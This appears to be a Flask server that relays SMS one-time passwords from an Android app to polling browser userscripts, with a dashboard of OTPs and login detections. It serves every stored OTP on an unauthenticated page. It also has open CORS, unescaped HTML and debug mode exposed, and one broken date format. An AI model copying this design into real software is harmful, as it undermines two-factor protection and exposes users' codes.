from flask import Flask, request, jsonify, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import zoneinfo
import threading

app = Flask(__name__)
CORS(app)

# =========================
# Storage (in-memory)
# =========================
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":..., "is_vehicle_otp": False}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":..., "is_vehicle_otp": True}]
otp_data = {}      # token -> list of delivered OTPs (with browser_id & timestamp)
client_sessions = {}   # (token, identifier, browser_id) -> {"first_request": datetime}
browser_queues = {}    # (token, identifier) -> [browser_id1, browser_id2, ...]
login_sessions = {}    # mobile_number -> [ { "timestamp":..., "source":... }, ... ]

IST = zoneinfo.ZoneInfo("Asia/Kolkata")
store_lock = threading.Lock()

# =========================
# Helpers
# =========================
def now():
    return datetime.now(IST)

def now_str():
    return now().strftime("%Y-%m-%d %H:%M:%S")

def purge_unsent_otps_before(token: str, identifier: str, cutoff_time: datetime):
    """
    Remove any undelivered OTPs (mobile or vehicle) for (token, identifier)
    whose timestamp is <= cutoff_time. This ensures a browser that just connected
    will not receive older OTPs.
    """
    with store_lock:
        # Purge vehicle_otps where identifier is vehicle text
        global vehicle_otps, mobile_otps
        vehicle_before = [o for o in vehicle_otps
                          if not (o["token"] == token and o.get("vehicle", "").upper() == identifier and o["timestamp"] <= cutoff_time)]
        vehicle_otps[:] = vehicle_before  # in-place replacement

        # Purge mobile_otps where identifier is sim_number
        mobile_before = [o for o in mobile_otps
                         if not (o["token"] == token and o.get("sim_number", "").upper() == identifier and o["timestamp"] <= cutoff_time)]
        mobile_otps[:] = mobile_before

def add_browser_to_queue(token, identifier, browser_id):
    """
    Register browser and set first_request time. Immediately purge any older
    undelivered OTPs for this (token, identifier) that arrived before the browser joined.
    """
    key = (token, identifier)
    with store_lock:
        if key not in browser_queues:
            browser_queues[key] = []
        if browser_id not in browser_queues[key]:
            browser_queues[key].append(browser_id)
            # set first_request to now()
            client_sessions[(token, identifier, browser_id)] = {"first_request": now()}
            # Purge any previously received undelivered OTPs older than this moment
            cutoff = client_sessions[(token, identifier, browser_id)]["first_request"]
    # Purge outside inner lock-block is safe because purge uses the lock itself;
    # however we already released the lock before calling purge to avoid nested locking.
    purge_unsent_otps_before(token, identifier, cutoff)

def get_next_browser(token, identifier):
    key = (token, identifier)
    with store_lock:
        if key in browser_queues and browser_queues[key]:
            return browser_queues[key][0]
    return None

def pop_browser_from_queue(token, identifier):
    key = (token, identifier)
    with store_lock:
        if key in browser_queues and browser_queues[key]:
            browser_queues[key].pop(0)
            if not browser_queues[key]:
                browser_queues.pop(key, None)

# =========================
# API: receive OTP (from Android app)
# =========================
@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        token = (data.get('token') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        vehicle = (data.get('vehicle') or data.get('vehicle_number') or "").strip().upper()
        is_vehicle_flag = data.get('is_vehicle_otp', False)
        if isinstance(is_vehicle_flag, str):
            is_vehicle_flag = is_vehicle_flag.lower() in ("1", "true", "yes")

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": now(),
            "is_vehicle_otp": bool(is_vehicle_flag)
        }

        with store_lock:
            # Priority: vehicle text -> explicit vehicle flag -> mobile
            if vehicle:
                entry["vehicle"] = vehicle
                entry["is_vehicle_otp"] = True
                vehicle_otps.append(entry)
                stored_as = "vehicle"
            elif is_vehicle_flag:
                entry["vehicle"] = ""  # flagged as vehicle OTP but no vehicle text
                entry["is_vehicle_otp"] = True
                vehicle_otps.append(entry)
                stored_as = "vehicle"
            else:
                entry["sim_number"] = sim_number or "UNKNOWNSIM"
                entry["is_vehicle_otp"] = False
                mobile_otps.append(entry)
                stored_as = "mobile"

        return jsonify({"status": "success", "message": "OTP stored", "stored_as": stored_as}), 200
    except Exception as e:
        app.logger.exception("receive_otp error")
        return jsonify({"status": "error", "message": str(e)}), 400

# =========================
# API: get latest OTP (polled by userscript)
# =========================
@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()
    browser_id = (request.args.get('browser_id') or "").strip()

    if not token or (not sim_number and not vehicle) or not browser_id:
        return jsonify({"status": "error", "message": "token + sim_number/vehicle + browser_id required"}), 400

    identifier = sim_number if sim_number else vehicle
    # This will set first_request and purge older unsent OTPs for this (token, identifier)
    add_browser_to_queue(token, identifier, browser_id)

    session_key = (token, identifier, browser_id)
    session_time = client_sessions.get(session_key, {}).get("first_request", now())
    next_browser = get_next_browser(token, identifier)

    # Vehicle OTPs path
    if vehicle:
        with store_lock:
            new_otps = [
                o for o in vehicle_otps
                if o["token"] == token
                and o.get("vehicle", "").upper() == vehicle
                and o["timestamp"] > session_time
            ]
        if new_otps and next_browser == browser_id:
            latest = new_otps[0]
            with store_lock:
                if latest in vehicle_otps:
                    vehicle_otps.remove(latest)
                latest["browser_id"] = browser_id
                otp_data.setdefault(token, []).append(latest)
            pop_browser_from_queue(token, identifier)
            client_sessions.pop(session_key, None)
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "vehicle": latest.get("vehicle", ""),
                "is_vehicle_otp": bool(latest.get("is_vehicle_otp", True)),
                "browser_id": browser_id,
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "waiting"}), 200

    # Mobile OTPs path
    else:
        with store_lock:
            new_otps = [
                o for o in mobile_otps
                if o["token"] == token
                and o.get("sim_number", "").upper() == sim_number
                and o["timestamp"] > session_time
            ]
        if new_otps and next_browser == browser_id:
            latest = new_otps[0]
            with store_lock:
                if latest in mobile_otps:
                    mobile_otps.remove(latest)
                latest["browser_id"] = browser_id
                otp_data.setdefault(token, []).append(latest)
            pop_browser_from_queue(token, identifier)
            client_sessions.pop(session_key, None)
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "sim_number": latest.get("sim_number", ""),
                "is_vehicle_otp": bool(latest.get("is_vehicle_otp", False)),
                "browser_id": browser_id,
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "waiting"}), 200

# =========================
# Status / Dashboard (keeps your HTML layout)
# =========================
@app.route('/api/status', methods=['GET', 'POST'])
def status():
    global otp_data, login_sessions

    if request.method == 'POST':
        if "delete_selected_otps" in request.form:
            tokens_to_delete = request.form.getlist("otp_rows")
            for t, idx in (x.split(":") for x in tokens_to_delete):
                idx = int(idx)
                if t in otp_data and 0 <= idx < len(otp_data[t]):
                    otp_data[t].pop(idx)
                    if not otp_data[t]:
                        otp_data.pop(t)
            return redirect(url_for('status'))

        elif "delete_all_otps" in request.form:
            otp_data.clear()
            return redirect(url_for('status'))

        elif "delete_selected_logins" in request.form:
            logins_to_delete = request.form.getlist("login_rows")
            for x in logins_to_delete:
                m, idx = x.split(":")
                idx = int(idx)
                if m in login_sessions and 0 <= idx < len(login_sessions[m]):
                    login_sessions[m].pop(idx)
                    if not login_sessions[m]:
                        login_sessions.pop(m)
            return redirect(url_for('status'))

        elif "delete_all_logins" in request.form:
            login_sessions.clear()
            return redirect(url_for('status'))

    # OTP table
    otp_rows = ""
    for t, entries in otp_data.items():
        for i, e in enumerate(entries):
            otp_rows += f"""
            <tr>
                <td><input type='checkbox' name='otp_rows' value='{t}:{i}'></td>
                <td>{t}</td>
                <td>{e.get('sim_number','')}</td>
                <td>{e.get('vehicle','')}</td>
                <td>{e.get('otp','')}</td>
                <td>{e.get('browser_id','')}</td>
                <td>{e['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
            </tr>
            """

    # Login table
    login_rows = ""
    for m, entries in login_sessions.items():
        for i, e in enumerate(entries):
            login_rows += f"""
            <tr>
                <td><input type='checkbox' name='login_rows' value='{m}:{i}'></td>
                <td>{m}</td>
                <td>{e['timestamp'].strftime('%Y-%m-%-%d %H:%M:%S')}</td>
                <td>{e.get('source','')}</td>
            </tr>
            """

    html = f"""
    <html>
    <head>
        <title>KM OTP Dashboard</title>
        <style>
            body {{ font-family: 'Segoe UI', sans-serif; background:#f9f9f9; margin:0; }}
            h2 {{ margin:20px 0; text-align:center; }}
            .container {{ display:flex; min-height:100vh; }}
            .sidebar {{ width:220px; background:#2C3E50; padding:20px; color:white; }}
            .sidebar button {{ margin-bottom:15px; width:100%; padding:10px; border:none; background:#3498DB; color:white; cursor:pointer; border-radius:5px; }}
            .content {{ flex-grow:1; padding:30px; }}
            table {{ border-collapse: collapse; width:100%; background:white; }}
            th, td {{ border:1px solid #ddd; padding:8px; }}
            th {{ background:#2980B9; color:white; }}
        </style>
        <script>
            function showSection(id){{
                window.location.href = window.location.pathname + "?section=" + id;
            }}
            window.onload = function(){{
                const params = new URLSearchParams(window.location.search);
                const section = params.get('section');
                if(section){{
                    document.getElementById('otp_section').style.display = section=='otp_section'?'block':'none';
                    document.getElementById('login_section').style.display = section=='login_section'?'block':'none';
                }} else {{
                    document.getElementById('otp_section').style.display = 'block';
                    document.getElementById('login_section').style.display = 'none';
                }}
            }}
        </script>
    </head>
    <body>
        <h2>KM OTP Dashboard</h2>
        <div class="container">
            <div class="sidebar">
                <button onclick="showSection('otp_section')">OTP DATA</button>
                <button onclick="showSection('login_section')">LOGIN DETECTIONS</button>
            </div>
            <div class="content">
                <div id="otp_section" style="display:none;">
                    <h3>OTP Data</h3>
                    <form method="POST">
                        <table>
                            <tr><th>Select</th><th>TOKEN</th><th>MOBILE NUMBER</th><th>VEHICLE</th><th>OTP</th><th>BROWSER ID</th><th>DATE</th></tr>
                            {otp_rows if otp_rows else '<tr><td colspan="7">No OTPs found</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_otps">Delete Selected</button>
                        <button type="submit" name="delete_all_otps">Delete All</button>
                    </form>
                </div>
                <div id="login_section" style="display:none;">
                    <h3>Login Detections</h3>
                    <form method="POST">
                        <table>
                            <tr><th>Select</th><th>MOBILE</th><th>DATE</th><th>SOURCE</th></tr>
                            {login_rows if login_rows else '<tr><td colspan="4">No login detections</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_logins">Delete Selected</button>
                        <button type="submit" name="delete_all_logins">Delete All</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return html

# =========================
# Login Detection endpoints
# =========================
@app.route('/api/login-detect', methods=['POST'])
def login_detect():
    try:
        data = request.get_json(force=True)
        mobile_number = (data.get('mobile_number') or "").strip().upper()
        source = (data.get('source') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400

        entry = {"timestamp": now(), "source": source}
        with store_lock:
            login_sessions.setdefault(mobile_number, []).append(entry)

        return jsonify({"status": "success", "message": "Login detected"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/login-found', methods=['GET'])
def login_found():
    mobile_number = (request.args.get('mobile_number') or "").strip().upper()
    if not mobile_number:
        return jsonify({"status": "error", "message": "mobile_number required"}), 400

    with store_lock:
        if mobile_number in login_sessions:
            detections = [
                {"timestamp": e["timestamp"].strftime("%Y-%m-%d %H:%M:%S"), "source": e.get("source","")}
                for e in login_sessions[mobile_number]
            ]
            return jsonify({"status": "found", "mobile_number": mobile_number, "detections": detections}), 200
    return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200

# =========================
# Run App
# =========================
if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)
